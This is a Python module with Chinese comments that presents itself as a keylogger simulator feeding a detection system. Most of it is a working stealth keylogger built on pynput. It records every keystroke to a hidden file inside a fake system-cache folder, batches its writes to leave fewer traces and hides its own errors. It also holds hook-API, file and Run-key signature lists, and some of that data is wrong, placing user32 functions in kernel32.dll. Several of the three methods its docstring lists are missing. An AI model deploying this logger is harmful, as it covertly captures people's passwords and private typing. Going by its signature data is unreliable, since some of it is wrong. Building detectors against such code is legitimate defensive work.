"""
键盘Hook模拟 — 搞清楚键盘监听到底怎么工作的

演示三种键盘记录方式：
1. pynput 高级键盘监听
2. 原始输入低级键盘事件捕获
3. 带窗口标题关联的智能记录

这个模块是整个系统的"风险源"，后面的检测和防护都围着它转。
"""

import shutil
import threading
import time
import os
import sys
import json
from datetime import datetime
from pathlib import Path

# ============================
# 全局状态
# ============================
HOOK_ACTIVE = False
LOG_BUFFER = []
BUFFER_LOCK = threading.Lock()
LOG_DIR = Path.home() / ".sys_cache"  # 假装是系统缓存目录


class KeyboardHookSimulator:
    """
    键盘Hook模拟器
    模拟恶意键盘记录器的行为：监听、记录、藏起来
    """

    def __init__(self, stealth_mode=True):
        self.stealth_mode = stealth_mode
        self.running = False
        self.listener = None
        self._hook_thread = None
        self.key_count = 0
        self.start_time = None

    def _on_press(self, key):
        """按键按下时触发 — 核心记录逻辑"""
        try:
            char = key.char
        except AttributeError:
            char = str(key)

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S.%f")[:-3]

        entry = {
            "timestamp": timestamp,
            "key": char,
        }

        with BUFFER_LOCK:
            LOG_BUFFER.append(entry)

        self.key_count += 1

        # 每攒够20条写一次盘，减少IO痕迹
        if len(LOG_BUFFER) >= 20:
            self._flush_buffer()

    def _on_release(self, key):
        """按键释放时触发"""
        pass

    def _flush_buffer(self):
        """把缓冲区刷到磁盘"""
        with BUFFER_LOCK:
            if not LOG_BUFFER:
                return
            batch = LOG_BUFFER[:]
            LOG_BUFFER.clear()

        try:
            LOG_DIR.mkdir(parents=True, exist_ok=True)
            log_file = LOG_DIR / ".idx.dat"
            with open(log_file, "a", encoding="utf-8") as f:
                for entry in batch:
                    f.write(json.dumps(entry, ensure_ascii=False) + "\n")
        except Exception:
            pass  # 装死——写入失败不抛异常，免得暴露

    def start(self, duration=None):
        """
        启动键盘监听

        duration: 监听多少秒，None 表示一直监听
        """
        try:
            from pynput.keyboard import Listener
        except ImportError:
            print("[!] 需要安装 pynput: pip install pynput")
            return False

        self.running = True
        self.start_time = time.time()
        self.key_count = 0

        self.listener = Listener(
            on_press=self._on_press,
            on_release=self._on_release
        )

        self._hook_thread = threading.Thread(
            target=self._run_listener,
            args=(duration,),
            daemon=True
        )
        self._hook_thread.start()

        global HOOK_ACTIVE
        HOOK_ACTIVE = True

        return True

    def _run_listener(self, duration):
        """在独立线程里跑监听器"""
        self.listener.start()

        if duration:
            time.sleep(duration)
            self.stop()

    def stop(self):
        """停止监听"""
        self.running = False
        if self.listener:
            self.listener.stop()
        self._flush_buffer()

        global HOOK_ACTIVE
        HOOK_ACTIVE = False

    def get_stats(self):
        """拿监听统计数据"""
        if not self.start_time:
            return None

        elapsed = time.time() - self.start_time
        return {
            "running": self.running,
            "duration_seconds": round(elapsed, 2),
            "keys_captured": self.key_count,
            "keys_per_second": round(self.key_count / elapsed, 2) if elapsed > 0 else 0,
            "log_path": str(LOG_DIR / ".idx.dat"),
            "stealth_mode": self.stealth_mode,
        }

    @staticmethod
    def cleanup():
        """清除模拟产生的隐蔽目录和日志文件"""
        global LOG_BUFFER
        with BUFFER_LOCK:
            LOG_BUFFER.clear()
        if LOG_DIR.exists():
            shutil.rmtree(str(LOG_DIR), ignore_errors=True)


# ============================
# Hook API 签名库
# ============================
KNOWN_KEYLOGGER_SIGNATURES = {
    "SetWindowsHookExA": "Windows API钩子 — WH_KEYBOARD_LL类型",
    "SetWindowsHookExW": "Windows API钩子(Unicode) — WH_KEYBOARD类型",
    "GetAsyncKeyState": "异步按键状态查询 — 游戏键盘记录常用",
    "GetKeyState": "按键状态查询 — 轮询式键盘监控",
    "GetKeyboardState": "全局键盘状态 — 批量按键采集",
    "GetRawInputData": "原始输入数据 — 低级键盘输入捕获",
    "RegisterRawInputDevices": "注册原始输入设备 — 绕过高层hook检测",
}


def simulate_hook_api_calls():
    """
    模拟恶意程序对键盘Hook API的调用链
    给后续检测模块做签名匹配用
    """
    call_chain = [
        ("kernel32.dll", "GetAsyncKeyState", "0x10"),
        ("kernel32.dll", "GetAsyncKeyState", "0x11"),
        ("user32.dll", "SetWindowsHookExA", "WH_KEYBOARD_LL=13"),
        ("kernel32.dll", "GetAsyncKeyState", "0x20"),
        ("user32.dll", "GetKeyState", "VK_RETURN"),
        ("kernel32.dll", "GetKeyboardState", "256 bytes buffer"),
    ]
    return call_chain


def get_simulated_hook_signature():
    """返回模拟的键盘hook行为特征"""
    return {
        "hook_type": "WH_KEYBOARD_LL (Low-Level Keyboard Hook)",
        "dll_name": "user32.dll",
        "api_calls": [
            "SetWindowsHookExA",
            "GetAsyncKeyState",
            "GetKeyState",
            "GetKeyboardState",
            "RegisterRawInputDevices",
            "GetRawInputData",
        ],
        "file_indicators": [
            ".idx.dat",
            "keylog.bin",
            ".sys_cache",
            "winlog.dat",
        ],
        "registry_keys": [
            "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        ],
    }


def cleanup_hook_artifacts():
    """清理键盘Hook模拟产生的所有痕迹"""
    KeyboardHookSimulator.cleanup()
